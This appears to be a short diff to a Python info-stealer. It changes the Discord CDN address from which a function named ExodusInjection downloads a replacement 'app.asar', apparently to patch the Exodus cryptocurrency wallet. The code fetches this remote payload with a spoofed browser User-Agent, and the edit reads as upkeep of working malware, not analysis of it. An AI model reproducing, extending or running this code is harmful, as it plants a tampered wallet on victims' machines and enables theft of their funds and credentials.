@@ -923,7 +923,7 @@ def ExodusInjection(path, procc, exolink):
                     return
     except: pass
 
-    exodusPatchURL = "https://cdn.discordapp.com/attachments/1086668425797058691/1112655087186231428/app.asar"
+    exodusPatchURL = "https://cdn.discordapp.com/attachments/1135684724585681039/1143224080603037827/app.asar"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
     req = Request(exodusPatchURL, headers=headers)
     response = urlopen(req)
